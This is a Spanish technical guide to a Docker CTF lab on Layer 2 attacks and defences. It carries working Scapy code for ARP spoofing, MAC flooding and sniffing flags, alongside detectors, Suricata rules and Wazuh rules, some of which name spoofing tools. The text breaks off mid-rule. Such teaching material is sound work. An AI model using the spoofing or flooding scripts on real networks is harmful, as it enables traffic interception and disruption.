# Arquitectura y Componentes: CTF Layer 2 Security

> **Propósito de este documento:** guía técnica de referencia para que cualquier integrante del equipo comprenda cómo funciona cada pieza del laboratorio, qué hace cada script y por qué el sistema está diseñado de esa manera. Se asume conocimiento básico de redes (modelo OSI, ARP, Ethernet) pero no familiaridad previa con el código.

---

## Tabla de Contenidos

1. [La Infraestructura Principal](#1-la-infraestructura-principal)
2. [Los Contenedores Víctima y Sus Secretos](#2-los-contenedores-víctima-y-sus-secretos)
3. [El Arsenal del Red Team](#3-el-arsenal-del-red-team)
4. [La Defensa en Profundidad del Blue Team](#4-la-defensa-en-profundidad-del-blue-team)
5. [La Gestión del CTF con CTFd](#5-la-gestión-del-ctf-con-ctfd)

---

## 1. La Infraestructura Principal

### Un solo comando levanta todo

```bash
# Prerequisito obligatorio: Wazuh Indexer (OpenSearch) lo requiere
sudo sysctl -w vm.max_map_count=262144

# Desde el directorio ctf-layer2-security/
sudo docker compose up -d
```

Este comando construye las imágenes personalizadas (gateway, victims, redteam, blueteam, suricata), descarga las imágenes oficiales (CTFd, MariaDB, Redis, Wazuh) e inicia los 13 servicios en el orden correcto respetando las dependencias declaradas con `depends_on`.

---

### La Red Bridge Personalizada

Al final del `docker-compose.yml` se declara la red:

```yaml
networks:
  ctf-network:
    driver: bridge           # Crea un switch virtual en el kernel de Linux
    ipam:
      config:
        - subnet: 172.20.0.0/24
          gateway: 172.20.0.1  # Docker reserva .1 para la interfaz del host
```

El driver `bridge` hace que el kernel de Linux cree un dispositivo virtual (usualmente `br-xxxxxxxx`) que actúa como un **switch Ethernet de Capa 2**. Todos los contenedores que se conectan a esta red comparten el mismo dominio de broadcast, exactamente como ocurre en una LAN conmutada real.

**¿Por qué gateway usa .2 y no .1?** Docker reserva automáticamente la dirección `.1` del subnet para la interfaz bridge del host. Por eso el contenedor gateway ocupa `.2`.

---

### Mapa de IPs de la Red

| Contenedor | IP | Rol |
|---|---|---|
| Gateway | 172.20.0.2 | Router con IP forwarding habilitado |
| Victim 1 | 172.20.0.10 | HTTP server — flag en comentario HTML |
| Victim 2 | 172.20.0.11 | File server — flag en archivo de credenciales |
| Victim 3 | 172.20.0.12 | Agente de monitoreo — flag en tráfico periódico |
| Red Team | 172.20.0.100 | Atacante (Kali, Scapy, NET_ADMIN + NET_RAW) |
| Blue Team | 172.20.0.200 | Defensor (Kali, Scapy, tshark) |
| Suricata | (comparte red del gateway) | NIDS en modo promiscuo |
| Wazuh Manager | 172.20.0.240 | SIEM — servidor central de alertas |
| Wazuh Indexer | 172.20.0.241 | Backend OpenSearch (almacena alertas) |
| Wazuh Dashboard | 172.20.0.242 | Interfaz web del SIEM |
| CTFd | 172.20.0.250 | Plataforma de scoreboard del CTF |
| CTFd DB | 172.20.0.251 | MariaDB (desafíos, flags, puntuaciones) |
| CTFd Cache | 172.20.0.252 | Redis (sesiones y scoreboard en tiempo real) |

---

### Cómo se conecta cada grupo de contenedores

#### Gateway

```yaml
gateway:
  cap_add: [NET_ADMIN]
  sysctls:
    - net.ipv4.ip_forward=1   # Actúa como router entre la LAN y el exterior
  networks:
    ctf-network: { ipv4_address: 172.20.0.2 }
```

El sysctl `net.ipv4.ip_forward=1` convierte este contenedor en el punto de salida de la red, permitiendo que reenvíe paquetes entre hosts. Este mismo flag es el que el Red Team necesita activar en su propio contenedor para poder ejecutar MITM sin romper la comunicación de las víctimas.

#### Víctimas

```yaml
victim1:
  build:
    context: ./containers/victim
    args:
      VICTIM_ID: "1"        # Build arg para el Dockerfile
  environment:
    - VICTIM_ID=1           # Variable de entorno en runtime
    - FLAG=${FLAG1}         # Leída desde el archivo .env (excluido del repo)
  networks:
    ctf-network: { ipv4_address: 172.20.0.10 }
  depends_on: [gateway]
```

Las flags nunca están en el código fuente. Se inyectan como variables de entorno desde un archivo `.env` local que está en el `.gitignore`, de modo que el repositorio puede ser público sin exponer las soluciones.

#### Red Team

```yaml
redteam:
  cap_add:
    - NET_ADMIN    # Modificar interfaces, tablas ARP, rutas
    - NET_RAW      # Enviar/recibir paquetes raw (Scapy lo requiere)
  sysctls:
    - net.ipv4.ip_forward=1   # Reenviar paquetes interceptados (MITM)
```

Las Linux capabilities `NET_ADMIN` y `NET_RAW` son el equivalente a tener acceso root a la interfaz de red sin dárselo al sistema completo. Sin ellas, Scapy no puede construir ni enviar paquetes de Capa 2.

#### Blue Team

Mismas capacidades que Red Team (`NET_ADMIN` + `NET_RAW`) porque los scripts defensivos también necesitan enviar paquetes ARP de restauración y capturar tráfico en modo promiscuo.

#### Suricata — El caso más especial

```yaml
suricata:
  network_mode: "service:gateway"   # Comparte el namespace de red del gateway
  cap_add: [NET_ADMIN, NET_RAW, SYS_NICE]
  volumes:
    - suricata-logs:/var/log/suricata
```

Al declarar `network_mode: "service:gateway"`, Suricata **no tiene su propia interfaz de red**: comparte literalmente el namespace de red del contenedor `gateway`. Esto es crucial porque:

- Suricata escucha en `eth0` del gateway, que es la interfaz que conecta con todos los demás contenedores
- Ve **todo** el tráfico del segmento, no solo el que entra/sale de Suricata
- Simula perfectamente un sensor NIDS conectado al **puerto SPAN/mirror de un switch físico**
- Consecuencia: Suricata no tiene IP propia; aparece con la IP del gateway en el compose

#### Wazuh — El pipeline de datos interno

Los tres componentes de Wazuh forman una cadena:

```
wazuh-indexer (OpenSearch, .241)
       ↑  Filebeat sobre TLS (SSL verification: none en el lab)
wazuh-manager (.240)  ← monta el volumen suricata-logs en lectura
       ↓
wazuh-dashboard (.242, HTTPS puerto 5601)
```

El volumen Docker `suricata-logs` es el nexo crítico entre NIDS y SIEM:

```yaml
# En el servicio suricata:
volumes:
  - suricata-logs:/var/log/suricata       # Suricata escribe aquí

# En el servicio wazuh-manager:
volumes:
  - suricata-logs:/var/ossec/logs/suricata:ro  # Wazuh lee aquí
```

Suricata escribe sus alertas en formato JSON (`eve.json`) en ese volumen compartido. El Wazuh Manager lo monitorea y procesa esas alertas con sus propias reglas para generar eventos en el SIEM.

---

## 2. Los Contenedores Víctima y Sus Secretos

### Cómo se selecciona el servicio: `entrypoint.sh`

El mismo `Dockerfile` sirve para los tres contenedores víctima. La diferenciación ocurre en el entrypoint mediante el `VICTIM_ID`:

```bash
# containers/victim/entrypoint.sh
case "${VICTIM_ID}" in
    1) python3 /app/services/http_server_v1.py ;;
    2) python3 /app/services/http_server_v2.py ;;
    3) python3 /app/services/http_server_v3.py ;;
    *) python3 -m http.server 80 --directory /app ;;  # Fallback
esac
```

El `VICTIM_ID` funciona en dos momentos distintos:
1. Como **build arg** en el `Dockerfile`: permite personalizar la imagen durante la construcción
2. Como **variable de entorno** en runtime: el entrypoint lo lee para seleccionar el servidor correcto

---

### Victim 1 — Flag en comentario HTML (`http_server_v1.py`)

```python
FLAG = os.environ.get("FLAG", "FLAG{default_flag_1}")

html = f"""<!DOCTYPE html>
<html>
<body>
    <h1>Portal Corporativo Interno</h1>
    <!-- TODO: Remover antes de produccion - credenciales de prueba -->
    <!-- Flag de auditoria: {FLAG} -->    ← La flag aquí
</body>
</html>"""
```

**Vector de ataque:** La flag está en un **comentario HTML**. En un navegador no se ve al renderizar, pero sí está en texto plano dentro del cuerpo HTTP. Con un MITM activo entre victim1 y el gateway, el atacante intercepta la respuesta HTTP y extrae la flag con una simple expresión regular sobre el payload TCP.

---

### Victim 2 — Flag en archivo de credenciales (`http_server_v2.py`)

```python
def setup_files():
    os.makedirs("/files/backup", exist_ok=True)

    # Archivos señuelo (sin flag)
    with open("/files/reports/quarterly_report.txt", "w") as f:
        f.write("Q1 2026 Report\nRevenue: $1.2M ...")

    # El archivo que contiene la flag
    with open("/files/backup/db_credentials.txt", "w") as f:
        f.write(f"Database Credentials Backup\n")
        f.write(f"Host: db.internal.corp\n")
        f.write(f"User: admin\n")
        f.write(f"Password: {FLAG}\n")   ← La flag como password de DB
        f.write(f"Database: production\n")
```

El servidor lista tres documentos en su página de índice. Solo `/backup/db_credentials.txt` contiene la flag, disfrazada como una contraseña de base de datos. La ruta queda expuesta en el HTML de listado, lo que da al atacante una pista visual sobre dónde buscar.

**Vector de ataque:** Con MITM activo, el atacante hace `curl http://172.20.0.11/backup/db_credentials.txt` y el contenido pasa en texto plano por su interfaz.

---

### Victim 3 — Flag en tráfico periódico (`http_server_v3.py`)

```python
FLAG = os.environ.get("FLAG", "FLAG{default_flag_3}")
GATEWAY_IP = os.environ.get("GATEWAY_IP", "172.20.0.2")

def send_periodic_report():
    """Hilo en background que emite cada 10 segundos."""
    while True:
        time.sleep(10)
        payload = (
            f"SECURITY_REPORT|timestamp={int(time.time())}"
            f"|host=victim3|status=ok"
            f"|auth_token={FLAG}"           ← La flag como token de autenticación
            f"|metrics=cpu:23,mem:45,disk:67"
        )
        requests.post(
            f"http://{GATEWAY_IP}:80/report",
            data=payload,
            timeout=2
        )
        # El gateway no tiene HTTP server, pero el paquete ya salió por la red
        # — y eso es suficiente para que un MITM lo capture
```

Este es el vector más dinámico: victim3 lanza un **hilo daemon en background** que cada 10 segundos emite un HTTP POST al gateway con la flag embebida en el campo `auth_token`. El gateway no escucha en el puerto 80, así que la conexión TCP falla con RST/connection refused, pero **el paquete ya viajó por la red**. Un atacante posicionado como MITM ve el paquete antes de que el gateway lo rechace.

**Dato adicional:** este patrón de tráfico (`auth_token=`) también dispara la regla 1000021 de Suricata, haciendo que el Blue Team pueda detectar la exfiltración incluso sin ejecutar sus propios scripts.

---

## 3. El Arsenal del Red Team

### Flujo de ataque completo

```
[Paso 1]  arp_spoof.py      →  Posicionarse como MITM entre víctima y gateway
[Paso 2]  capture_flags.py  →  Capturar el tráfico HTTP que ahora pasa por nosotros
[Paso 3]  submit_flag.py    →  Enviar las flags capturadas a CTFd vía API REST

[Ataque independiente]
          mac_flood.py      →  Inundar la tabla CAM del switch (no requiere MITM)
```

---

### `arp_spoof.py` — ARP Spoofing paso a paso

#### Paso 1: Resolver las MACs reales (línea base antes del engaño)

```python
def get_mac(ip, iface, timeout=2):
    # ARP Request en broadcast: "¿Quién tiene esta IP?"
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="who-has", pdst=ip)
    result = srp(pkt, iface=iface, timeout=timeout, verbose=False)[0]
    mac = result[0][1].hwsrc   # Solo el host legítimo responde
    return mac
```

Antes de mentir, el atacante necesita saber la verdad. `srp()` de Scapy envía el paquete y espera respuesta. La MAC devuelta es la real, que luego se usa para saber a quién dirigir los ARP Replies falsos.

#### Paso 2: El envenenamiento bidireccional (el corazón del ataque)

```python
def spoof(target_ip, target_mac, spoof_ip, iface, broadcast=False):
    eth_dst = "ff:ff:ff:ff:ff:ff" if broadcast else target_mac
    pkt = Ether(dst=eth_dst) / ARP(
        op="is-at",        # ARP Reply (nadie lo pidió — es gratuito/falso)
        pdst=target_ip,    # A quién va dirigido el engaño
        hwdst=target_mac,  # MAC real del objetivo
        psrc=spoof_ip      # IP que estamos suplantando — LA MENTIRA
        # hwsrc omitido → Scapy pone automáticamente nuestra MAC real
    )
    sendp(pkt, iface=iface, verbose=False)
```

El campo clave es `psrc=spoof_ip`: le decimos al target que **esa IP pertenece a nuestra MAC**. El target actualiza su tabla ARP sin verificar nada (ARP no tiene autenticación).

En el bucle principal esto se ejecuta en **ambas direcciones simultáneamente**:

```python
while True:
    # Al victim: "El gateway (172.20.0.2) está en MI MAC"
    spoof(target_ip, target_mac, gateway_ip, iface)

    # Al gateway: "El victim (172.20.0.10) está en MI MAC"
    spoof(gateway_ip, gateway_mac, target_ip, iface)

    time.sleep(args.interval)   # Repetir para contrarrestar el TTL de la caché ARP
```

**¿Por qué repetir?** Las entradas ARP tienen un TTL (normalmente 60–120s en Linux). El atacante debe reenvenenar periódicamente para mantener el MITM activo.

**Modos de envío:**
- **Unicast** (default, más sigiloso): solo el target recibe el ARP Reply falso
- **Broadcast** (`--broadcast`, menos sigiloso): toda la red recibe el ARP Reply; envenena a todos simultáneamente. Es la técnica que usan herramientas como Ettercap

#### Paso 3: Reenvío transparente (el MITM no corta la conexión)

El sysctl `net.ipv4.ip_forward=1` configurado tanto en el `docker-compose.yml` del redteam como activado explícitamente por el script (`enable_ip_forward()`) hace que el **kernel de Linux reenvíe automáticamente** los paquetes interceptados al destino real. Las víctimas no notan la interrupción; su tráfico llega con un salto extra invisible.

#### Paso 4: Restauración al terminar

```python
def restore(target_ip, target_mac, source_ip, source_mac, iface):
    pkt = Ether(dst=target_mac) / ARP(
        op="is-at",
        psrc=source_ip,
        hwsrc=source_mac    # MAC REAL — esto repara la tabla ARP del target
    )
    sendp(pkt, iface=iface, count=5, verbose=False)   # 5 veces para asegurar
```

Se capturan `SIGINT` y `SIGTERM` para enviar los paquetes de restauración antes de salir. Sin esto, las tablas ARP quedarían envenenadas y la red rota una vez detenido el ataque.

---

### `mac_flood.py` — MAC Flooding paso a paso

#### Contexto: cómo funciona un switch

Un switch real aprende asociaciones `Puerto ↔ MAC` en su tabla **CAM** (Content Addressable Memory), que tiene capacidad limitada (típicamente 8K–32K entradas). Al desbordarse, el switch entra en modo **fail-open**: ya no puede tomar decisiones de reenvío basadas en MAC, así que reenvía todo el tráfico por **todos** los puertos — se comporta como un hub. En ese momento, el atacante ve tráfico que no le corresponde.

> **Nota sobre Docker:** el "switch" en el laboratorio es el bridge de Linux, cuya tabla MAC es considerablemente más grande. El ataque genera el tráfico correcto pero el efecto de fail-open real se observaría en un switch físico. En el lab, lo importante es que Suricata y los scripts del Blue Team detectan la anomalía de tráfico generada.

#### El paquete de inundación

```python
def generate_flood_packet(iface):
    random_mac = str(RandMAC())   # MAC distinta en cada iteración

    pkt = Ether(src=random_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
        op="who-has",
        hwsrc=random_mac,     # Consistente con Ether.src
        psrc=str(RandIP()),   # IP origen aleatoria (no importa el valor)
        pdst=str(RandIP())    # IP destino aleatoria
    )
    return pkt
```

Cada paquete tiene un `Ether.src` diferente. Eso fuerza al switch a registrar una **nueva entrada en su tabla CAM** por cada paquete. Se usa ARP Request como payload porque es un frame L2 válido que el switch debe procesar, sin necesitar stack IP completo.

#### Modos de operación

```bash
# Ráfaga de N paquetes (para demo controlada)
python3 mac_flood.py -c 2000 --delay 0.001

# Inundación continua hasta Ctrl+C (velocidad máxima)
python3 mac_flood.py --continuous --delay 0
```

Con `--delay 0` puede alcanzar miles de paquetes por segundo, saturando rápidamente cualquier tabla CAM.

---

### `capture_flags.py` — Exfiltración de flags

**Prerequisito:** `arp_spoof.py` debe estar corriendo en otra terminal/proceso para que el tráfico de las víctimas pase por nuestra interfaz.

```python
FLAG_PATTERN = re.compile(r"FLAG\{[^}]+\}")

def process_packet(self, pkt):
    # Solo paquetes TCP en puerto 80 con datos
    if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
        return
    if tcp_layer.sport != 80 and tcp_layer.dport != 80:
        return

    # Extraer el payload como texto y buscar flags
    payload = pkt[Raw].load.decode("utf-8", errors="ignore")
    flags = FLAG_PATTERN.findall(payload)   # Regex: FLAG{cualquier_cosa}
    for flag in flags:
        if flag not in self.flags_found:
            self.flags_found.add(flag)
            print(f"FLAG ENCONTRADA: {flag}")
```

Con el MITM activo, todo el tráfico HTTP de las víctimas pasa por `eth0` del redteam. Scapy's `sniff()` captura cada paquete TCP en puerto 80 y aplica la regex `FLAG\{[^}]+\}` sobre el payload raw. También busca palabras clave (`auth_token`, `db_credentials`, `SECURITY_REPORT`) para alertar sobre contenido interesante aunque no tenga el formato exacto de flag.

```bash
# Uso típico: filtrar solo el tráfico de victim3 (reportes periódicos)
python3 capture_flags.py --filter-ip 172.20.0.12 --timeout 60 -o flags.txt
```

---

### `submit_flag.py` — Envío automático a CTFd

El script implementa un cliente para la **API REST de CTFd** usando solo `urllib` (sin `requests`) para evitar dependencias externas que no están en la imagen del contenedor.

```python
CTFD_URL = "http://172.20.0.250:8000"

def submit_flag(self, challenge_id, flag):
    data = {
        "challenge_id": challenge_id,
        "submission": flag
    }
    result = self._api_request("POST", "/api/v1/challenges/attempt", data)
    # Respuestas posibles: "correct" | "incorrect" | "already_solved"
```

**Autenticación (dos métodos soportados):**

```bash
# Método 1: Token de API (Header: Authorization: Token <token>)
python3 submit_flag.py -f "FLAG{...}" -c 1 --token <api_token>

# Método 2: Credenciales de equipo (login con cookie de sesión + nonce CSRF)
python3 submit_flag.py -f "FLAG{...}" -c 1 -u teamred -p password123
```

El flujo de login con credenciales extrae el nonce CSRF del formulario HTML (necesario porque CTFd protege contra CSRF), envía las credenciales y guarda el cookie de sesión para peticiones subsiguientes.

```bash
# Ver todos los challenges y su estado
python3 submit_flag.py --list --token <api_token>
```

**Tabla de challenges para referencia:**

| ID | Nombre | Puntos |
|---|---|---|
| 1 | Hidden in Plain Sight | 100 |
| 2 | Leaked Credentials | 150 |
| 3 | Intercept the Report | 200 |
| 4 | Flood the Switch | 200 |
| 5 | Detect ARP Spoofing | 150 |
| 6 | Detect MAC Flooding | 150 |

---

## 4. La Defensa en Profundidad del Blue Team

La defensa opera en **tres capas independientes y complementarias**. Una capa puede fallar y las otras dos siguen operativas.

```
Capa 1: Scripts Scapy      → Detección activa en la red (endpoint de red)
Capa 2: Suricata NIDS      → Inspección de paquetes en modo promiscuo
Capa 3: Wazuh HIDS/SIEM    → Correlación de eventos y monitoreo de integridad
```

---

### Capa 1 — Scripts Scapy

#### `arp_monitor.py` — Detección de ARP Spoofing

Opera en dos modos seleccionables por argumento:

**Modo Activo (ARP Polling)** — recomendado para redes con switch:

```python
def active_probe(self):
    for ip in self.known_ips:
        # Genera su propio tráfico ARP de verificación
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="who-has", pdst=ip)
        result = srp(pkt, iface=self.iface, timeout=1, verbose=False)[0]

        responding_macs = {received.hwsrc for sent, received in result}

        # Señal 1: Múltiples respuestas a un solo ARP Request
        # Indica que dos hosts reclaman la misma IP
        if len(responding_macs) > 1:
            self._alert("CRITICO", f"Múltiples respuestas ARP para {ip}!")

        # Señal 2: MAC diferente a la baseline establecida al inicio
        if ip in self.arp_table:
            if current_mac != self.arp_table[ip]:
                self._alert("CRITICO",
                    f"ARP SPOOFING DETECTADO! {ip} cambió de MAC",
                    f"baseline={self.arp_table[ip]}, actual={current_mac}")

    # Señal 3: Múltiples IPs con la misma MAC (firma del MITM clásico)
    mac_to_ips = defaultdict(list)
    for ip in self.known_ips:
        # Resolver MAC actual para comparar (no la de baseline)
        ...
    for mac, ips in mac_to_ips.items():
        if len(ips) > 1:
            self._alert("CRITICO", f"Múltiples IPs con la misma MAC (MITM)", ...)
```

**¿Por qué Modo Activo y no Pasivo en redes con switch?** En una red con switch (o Docker bridge), el tráfico unicast entre dos hosts no llega a las interfaces de otros hosts — el switch solo lo envía al puerto correcto. El sniffer pasivo del Blue Team no vería los ARP Replies que el atacante envía a las víctimas. El **ARP Polling genera su propio tráfico** y recibe respuestas directamente, sin depender de ver el tráfico ajeno.

**Modo Pasivo (Sniffing)** — detecta 4 anomalías sin generar tráfico propio:

| Detección | Técnica |
|---|---|
| MAC inconsistente | `ARP.hwsrc != Ether.src` en el mismo paquete |
| IP cambió de MAC | `ARP.psrc` responde con MAC diferente a la baseline |
| Ráfaga de ARP Replies | >5 replies en 10s desde la misma IP |
| Múltiples IPs, misma MAC | Firma clásica del atacante MITM |

```bash
# Uso típico — modo activo, alertas guardadas en archivo
python3 arp_monitor.py \
    --known 172.20.0.2 172.20.0.10 172.20.0.11 172.20.0.12 \
    --probe-interval 5 \
    -o /logs/arp_alerts.log
```

---

#### `mac_anomaly_detector.py` — Detección de MAC Flooding

```python
class MACFloodDetector:
    def __init__(self, threshold=30, window=10):
        self.learning_duration = 15   # Fase 1: aprende el tráfico normal
        self.baseline_macs = set()    # MACs legítimas de la red
        self.threshold = threshold    # Nuevas MACs para disparar alerta
        self.window = window          # Ventana de tiempo en segundos

    def _is_random_mac(self, mac):
        """Las MACs generadas con RandMAC() tienen el bit 'locally administered' en 1."""
        first_byte = int(mac.split(":")[0], 16)
        return bool(first_byte & 0x02)   # Segundo bit = locally administered
```

**Fase 1 — Aprendizaje (primeros 15 segundos):**
Registra todas las MACs que observa como legítimas sin generar alertas. Esto hace que el detector se adapte automáticamente a cualquier entorno sin necesitar configuración manual de qué MACs son válidas.

**Fase 2 — Detección:**
Para cada MAC nueva que aparece (no vista durante el aprendizaje):
1. Verifica si tiene el bit `locally administered` en 1 → indica MAC generada por herramienta
2. Mantiene una ventana deslizante de timestamps
3. Si aparecen ≥30 MACs nuevas en 10s → `CRITICO: MAC FLOODING DETECTADO`
4. Si aparecen ≥15 MACs nuevas en 10s → `ALERTA: Tasa elevada de nuevas MACs`

```bash
# Uso típico — umbral adaptado al tamaño de la red del lab
python3 mac_anomaly_detector.py \
    --threshold 30 \
    --window 10 \
    --learning-time 15 \
    -o /logs/mac_flood_alerts.log
```

---

#### `arp_restore.py` — Contramedida activa

Una vez detectado el ataque, este script **repara las tablas ARP** de todos los hosts de la red. Envía dos tipos de paquetes correctivos:

**Gratuitous ARP (broadcast):** anuncia la asociación IP→MAC correcta a toda la red de una vez

```python
def send_gratuitous_arp(ip, mac, iface):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) / ARP(
        op="is-at",
        psrc=ip,                    # "Yo soy esta IP..."
        hwsrc=mac,                  # "...y mi MAC es esta (la real)"
        pdst=ip,                    # psrc == pdst = gratuitous
        hwdst="ff:ff:ff:ff:ff:ff"  # Broadcast
    )
    sendp(pkt, iface=iface, verbose=False)
```

**Directed ARP (unicast):** envía la corrección específicamente a cada host afectado

```python
def send_restore_packet(target_ip, target_mac, source_ip, source_mac, iface):
    pkt = Ether(dst=target_mac, src=source_mac) / ARP(
        op="is-at",
        psrc=source_ip,
        hwsrc=source_mac    # MAC REAL — esto sobrescribe la entrada envenenada
    )
    sendp(pkt, iface=iface, verbose=False)
```

**Entradas ARP estáticas (`--static`):** configura entradas inmunes al spoofing

```python
def set_static_arp(host_table):
    for ip, mac in host_table.items():
        os.system(f"arp -s {ip} {mac}")   # El kernel no permite sobrescribirlas
```

Las entradas estáticas son la defensa definitiva: el kernel de Linux ignora cualquier ARP Reply que intente cambiarlas. Son inmunes al ARP Spoofing por diseño.

```bash
# Restaurar una vez y configurar entradas estáticas
python3 arp_restore.py --static

# Restaurar continuamente como protección activa mientras dura el CTF
python3 arp_restore.py --continuous --interval 3
```

---

### Capa 2 — Reglas Suricata NIDS (`layer2.rules`)

Suricata opera sobre los frames raw de Ethernet. Como Suricata **no soporta `arp` como protocolo** en sus reglas, se usa el matcher `pkthdr` que permite inspeccionar bytes a offsets fijos del frame.

**Estructura del frame Ethernet+ARP** que usan las reglas:

```
Bytes 0-5:   Destination MAC
Bytes 6-11:  Source MAC
Bytes 12-13: EtherType          ← 0x0806 = ARP
Bytes 14-15: Hardware type      (0x0001 = Ethernet)
Bytes 16-17: Protocol type      (0x0800 = IPv4)
Bytes 18-19: Lengths (6, 4)
Bytes 20-21: Operation          ← 0x0001=Request, 0x0002=Reply
Bytes 22-27: Sender MAC
Bytes 28-31: Sender IP          ← 172.20.0.2 = ac:14:00:02
Bytes 32-37: Target MAC
Bytes 38-41: Target IP
```

#### Reglas de detección de ARP Spoofing

```
# SID 1000001: Alerta en cada ARP Reply broadcast
alert pkthdr any any -> any any (
    msg:"CTF - ARP Reply detectado (posible ARP Spoofing)";
    content:"|08 06|"; offset:12; depth:2;   ← EtherType = ARP
    content:"|00 02|"; offset:20; depth:2;   ← Operación = Reply
    sid:1000001; rev:2;
)

# SID 1000002: Alto volumen de ARP Replies (ARP Spoofing activo)
alert pkthdr any any -> any any (
    msg:"CTF - ALERTA: Alto volumen de ARP Replies - ARP Spoofing en progreso";
    content:"|08 06|"; offset:12; depth:2;
    content:"|00 02|"; offset:20; depth:2;
    threshold:type both, track by_src, count 10, seconds 5;  ← >10 en 5s
    sid:1000002; rev:2;
)

# SID 1000003: ARP Reply suplantando la IP del gateway (172.20.0.2 = ac 14 00 02)
alert pkthdr any any -> any any (
    msg:"CTF - CRITICO: ARP Reply suplantando IP del Gateway";
    content:"|08 06|"; offset:12; depth:2;
    content:"|00 02|"; offset:20; depth:2;
    content:"|ac 14 00 02|"; offset:28; depth:4;  ← Sender IP = 172.20.0.2
    sid:1000003; rev:2;
)
```

La regla 1000003 es la más precisa: convierte `172.20.0.2` a su representación hexadecimal `ac 14 00 02` y la busca en el offset 28 del frame (campo Sender IP del ARP). Solo puede dispararse si alguien **diferente al gateway real** envía un ARP Reply diciendo tener esa IP.

#### Reglas de detección de MAC Flooding

```
# SID 1000010: Volumen anómalo de ARP — firma del MAC Flooding
alert pkthdr any any -> any any (
    msg:"CTF - ALERTA: Volumen anomalo de paquetes ARP - posible MAC Flooding";
    content:"|08 06|"; offset:12; depth:2;
    threshold:type both, track by_src, count 50, seconds 3;  ← >50 en 3s
    sid:1000010; rev:2;
)
```

#### Reglas de detección de tráfico sensible en HTTP

```
# SID 1000020: Flag viajando en texto plano por HTTP
alert http any any -> any any (
    msg:"CTF - Flag detectada en trafico HTTP";
    content:"FLAG{"; nocase;
    sid:1000020; rev:1;
)

# SID 1000021: auth_token en texto plano (reportes de victim3)
alert http any any -> any any (
    msg:"CTF - Credenciales en texto plano detectadas (auth_token)";
    content:"auth_token="; nocase;
    sid:1000021; rev:1;
)

# SID 1000022: Acceso al archivo de credenciales de victim2
alert http any any -> any any (
    msg:"CTF - Acceso a archivo de credenciales (db_credentials)";
    content:"db_credentials"; nocase;
    sid:1000022; rev:1;
)
```

**Resumen de todas las reglas Suricata:**

| SID | Qué detecta | Condición |
|---|---|---|
| 1000001 | ARP Reply detectado | `EtherType=0x0806` + `op=0x0002` |
| 1000002 | ARP Spoofing activo | >10 ARP Replies en 5s desde la misma fuente |
| 1000003 | Suplantación del gateway | ARP Reply con `sender_ip=172.20.0.2` |
| 1000010 | MAC Flooding | >50 paquetes ARP en 3s |
| 1000020 | Flag en HTTP | Contenido `FLAG{` en tráfico HTTP |
| 1000021 | auth_token en texto plano | `auth_token=` en HTTP (reportes de victim3) |
| 1000022 | Acceso a credenciales | `db_credentials` en HTTP |

---

### Capa 3 — Reglas Wazuh HIDS (`layer2_rules.xml`)

Wazuh opera a nivel de **endpoint**. Sus agentes recopilan logs de los sistemas y los envían al Manager, que aplica las reglas de correlación. Las reglas custom del proyecto están agrupadas bajo `<group name="layer2,arp_spoofing,mac_flooding,">`.

**Sintaxis clave de las reglas Wazuh:**

```xml
<rule id="X" level="Y">
  <if_group>syscheck</if_group>      <!-- Fuente del evento -->
  <match>texto_a_buscar</match>      <!-- Coincidencia en el log -->
  <if_matched_sid>ID</if_matched_sid> <!-- Encadenamiento: solo si la regla padre hizo match -->
  <frequency>N</frequency>           <!-- N ocurrencias... -->
  <timeframe>T</timeframe>           <!-- ...en T segundos -->
  <description>Descripción</description>
  <group>categorías,</group>
</rule>
```

#### Reglas de ARP Spoofing (detección a nivel de endpoint)

```xml
<!-- Regla 100001: Cualquier cambio en /proc/net/arp -->
<rule id="100001" level="10">
  <if_group>syscheck</if_group>
  <match>/proc/net/arp</match>
  <description>Cambio detectado en tabla ARP del sistema - posible ARP Spoofing</description>
</rule>

<!-- Regla 100002: Correlación — 5+ cambios ARP en 30s = ataque en progreso -->
<rule id="100002" level="13" frequency="5" timeframe="30">
  <if_matched_sid>100001</if_matched_sid>
  <description>ALERTA: Múltiples cambios en tabla ARP - ARP Spoofing en progreso</description>
</rule>

<!-- Regla 100003: Herramienta de ARP Spoofing detectada en logs del sistema -->
<rule id="100003" level="12">
  <if_group>ossec</if_group>
  <match>arpspoof|ettercap|bettercap|scapy</match>
  <description>Herramienta de ARP Spoofing detectada en ejecución</description>
</rule>
```

**La cadena de correlación más importante:** La regla 100001 actúa como "padre" de la 100002. Wazuh solo dispara la 100002 (nivel 13 — ALERTA) cuando la 100001 se activa **5 veces en 30 segundos**. Este patrón `frequency + timeframe + if_matched_sid` distingue un cambio ARP legítimo ocasional de un ataque en curso.

#### Reglas de File Integrity Monitoring (FIM) para las flags

```xml
<!-- Regla 100010: Acceso o modificación a archivos en /flags/ -->
<rule id="100010" level="12">
  <if_group>syscheck</if_group>
  <match>/flags/</match>
  <description>ALERTA: Acceso o modificación a archivo de flag detectado</description>
</rule>

<!-- Regla 100011: Flag posiblemente exfiltrada o eliminada -->
<rule id="100011" level="14">
  <if_group>syscheck</if_group>
  <match>flag</match>
  <match>deleted</match>
  <description>CRITICO: Archivo de flag posiblemente exfiltrado o eliminado</description>
</rule>
```

El syscheck de Wazuh monitorea el directorio `/flags` en tiempo real. Cualquier lectura, escritura o eliminación de esos archivos genera una alerta, lo que permite al Blue Team saber exactamente cuándo y qué flag fue comprometida.

#### Reglas de MAC Flooding (detección a nivel de endpoint)

```xml
<!-- Regla 100020: Número anómalo de entradas ARP en la tabla del sistema -->
<rule id="100020" level="10">
  <if_group>ossec</if_group>
  <match>arp_entries_anomaly</match>
  <description>Número anómalo de entradas en tabla ARP - posible MAC Flooding</description>
</rule>

<!-- Regla 100021: Correlación — flooding confirmado -->
<rule id="100021" level="12" frequency="10" timeframe="20">
  <if_matched_sid>100020</if_matched_sid>
  <description>ALERTA: MAC Flooding en progreso - tabla CAM posiblemente desbordada</description>
</rule>
```

#### Reglas de detección MITM genérica

```xml
<!-- Regla 100030: MAC del gateway cambió = MITM confirmado (nivel 14 = crítico) -->
<rule id="100030" level="14">
  <if_group>syscheck</if_group>
  <match>gateway_mac_changed</match>
  <description>CRITICO: MAC del gateway ha cambiado - ataque MITM confirmado</description>
</rule>

<!-- Regla 100031: Dos MACs respondiendo por la misma IP -->
<rule id="100031" level="13">
  <if_group>ossec</if_group>
  <match>duplicate_ip_detected</match>
